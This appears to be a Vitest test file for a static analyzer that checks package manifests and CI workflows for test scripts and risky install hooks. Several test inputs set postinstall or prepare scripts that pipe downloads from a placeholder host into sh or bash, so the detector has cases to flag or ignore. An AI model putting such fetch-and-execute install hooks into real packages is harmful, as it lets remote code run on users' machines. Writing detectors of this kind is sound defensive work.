import { describe, expect, it } from 'vitest';
import { analyze } from '../server/rules.js';
import { demoSnapshot } from '../server/demo.js';
function withManifest(text, variant = 'before') {
  const snapshot = demoSnapshot(variant);
  snapshot.files.find((f) => f.path === 'package.json').text = text;
  return snapshot;
}
function ci(text) {
  const snapshot = demoSnapshot('after');
  snapshot.files.find((f) => f.path.endsWith('.yml')).text = text;
  return analyze(snapshot).find((r) => r.ruleId === 'CI-01');
}
describe('rule contracts and evidence', () => {
  it('identifies all three independently seeded demo conditions', () => {
    expect(analyze(demoSnapshot()).map((r) => r.outcome)).toEqual(['match', 'match', 'match']);
  });
  it('does not flag the statically corrected fixture', () => {
    expect(analyze(demoSnapshot('after')).map((r) => r.outcome)).toEqual([
      'no_match',
      'no_match',
      'no_match',
    ]);
  });
  it('is deterministic and does not mutate captured files', () => {
    const snapshot = demoSnapshot(),
      original = structuredClone(snapshot);
    expect(analyze(snapshot)).toEqual(analyze(snapshot));
    expect(snapshot).toEqual(original);
  });
  it('preserves physical source lines, including CRLF input', () => {
    const snapshot = demoSnapshot();
    snapshot.files.forEach((f) => {
      f.text = f.text.replaceAll('\n', '\r\n');
    });
    for (const check of analyze(snapshot))
      for (const ev of check.evidence.filter((e) => e.path)) {
        const text = snapshot.files.find((f) => f.path === ev.path).text;
        expect(ev.text).toBe(
          text
            .split(/\r?\n/)
            .slice(ev.startLine - 1, ev.endLine)
            .join('\n'),
        );
      }
    expect(analyze(snapshot)[0].evidence[0].startLine).toBe(7);
  });
  it('does not invent lines for an absent test key', () => {
    const result = analyze(withManifest('{"scripts":{}}'))[1];
    expect(result.outcome).toBe('match');
    expect(result.evidence[0].startLine).toBeUndefined();
  });
  it.each([
    '{',
    'null',
    '[]',
    '{"scripts":[]}',
    '{"scripts":null}',
    '{"scripts":{"test":"a","test":"b"}}',
  ])('treats invalid/ambiguous manifest as inconclusive: %s', (text) => {
    expect(analyze(withManifest(text)).every((r) => r.outcome === 'inconclusive')).toBe(true);
  });
  it('separates unsupported repositories from incomplete captures', () => {
    const snapshot = demoSnapshot();
    snapshot.files = [];
    snapshot.inventory = [];
    expect(analyze(snapshot).every((r) => r.outcome === 'not_applicable')).toBe(true);
    snapshot.inventoryComplete = false;
    expect(analyze(snapshot).every((r) => r.outcome === 'inconclusive')).toBe(true);
  });
  it('marks npm workspaces out of scope', () => {
    expect(
      analyze(withManifest('{"workspaces":["packages/*"]}')).every(
        (r) => r.outcome === 'not_applicable',
      ),
    ).toBe(true);
  });
  it('does not equate test naming signals with an entry point', () => {
    const result = analyze(withManifest('{"scripts":{},"devDependencies":{"vitest":"4"}}'))[1];
    expect(result.outcome).toBe('match');
    expect(result.signals.vitestDeclared).toBe(true);
    expect(result.signals.paths).toContain('src/cart.test.js');
  });
  it('does not mark arbitrary lifecycle scripts or quoted examples as the supported pipeline', () => {
    for (const command of [
      'node setup.js',
      'echo "curl https://example.invalid/x | sh"',
      'cat <<EOF\ncurl https://example.invalid/x | sh\nEOF',
      'curl https://$HOST/setup | sh',
    ]) {
      expect(
        analyze(withManifest(JSON.stringify({ scripts: { postinstall: command } })))[0].outcome,
      ).toBe('no_match');
    }
  });
  it('recognizes the documented wget form', () => {
    expect(
      analyze(
        withManifest(
          JSON.stringify({ scripts: { prepare: 'wget -qO- https://example.invalid/x | bash -s' } }),
        ),
      )[0].outcome,
    ).toBe('match');
  });
  it('treats non-string script values as inconclusive', () => {
    const results = analyze(withManifest('{"scripts":{"test":null,"install":42}}'));
    expect(results[0].outcome).toBe('inconclusive');
    expect(results[1].outcome).toBe('inconclusive');
  });
});
describe('CI recognition boundaries', () => {
  it('does not infer test execution from workflow/job names or echo text', () => {
    expect(
      ci('name: npm test\njobs:\n  test:\n    steps:\n      - run: echo "npm test"\n').outcome,
    ).toBe('match');
  });
  it('recognizes multiline literal direct commands with source evidence', () => {
    const result = ci(
      'jobs:\n  verify:\n    if: false\n    steps:\n      - run: |\n          npm ci\n          npm test\n',
    );
    expect(result.outcome).toBe('no_match');
    expect(result.evidence[0].text).toContain('npm test');
    expect(result.limitations).toContain('conditions');
  });
  it.each(['jobs: [', 'jobs: {}', 'jobs:\n  a:\n    steps: broken'])(
    'does not convert malformed workflows to missing tests',
    (text) => {
      expect(ci(text).outcome).toBe('inconclusive');
    },
  );
  it('treats reused workflows, arbitrary actions and custom commands as inconclusive', () => {
    expect(analyze(demoSnapshot('delegated'))[2].outcome).toBe('inconclusive');
    expect(ci('jobs:\n  a:\n    steps:\n      - uses: other/test-action@main\n').outcome).toBe(
      'inconclusive',
    );
    expect(ci('jobs:\n  a:\n    steps:\n      - run: ./ci.sh\n').outcome).toBe('inconclusive');
  });
  it('does not mistake shell heredoc content or chained commands for direct execution', () => {
    expect(
      ci(
        'jobs:\n  a:\n    steps:\n      - run: |\n          cat <<EOF\n          npm test\n          EOF\n',
      ).outcome,
    ).toBe('inconclusive');
    expect(ci('jobs:\n  a:\n    steps:\n      - run: npm ci && npm test\n').outcome).toBe(
      'inconclusive',
    );
  });
  it('does not issue a gap finding when inventory or relevant files are missing', () => {
    const snapshot = demoSnapshot();
    snapshot.inventoryComplete = false;
    expect(analyze(snapshot)[2].outcome).toBe('inconclusive');
    snapshot.inventoryComplete = true;
    snapshot.files = snapshot.files.filter((f) => !f.path.endsWith('.yml'));
    expect(analyze(snapshot)[2].outcome).toBe('inconclusive');
  });
  it('treats non-shell interpreters and invalid steps as inconclusive', () => {
    expect(
      ci('jobs:\n  a:\n    steps:\n      - run: npm test\n        shell: python\n').outcome,
    ).toBe('inconclusive');
    expect(ci('jobs:\n  a:\n    steps:\n      - name: no executable step\n').outcome).toBe(
      'inconclusive',
    );
  });
});
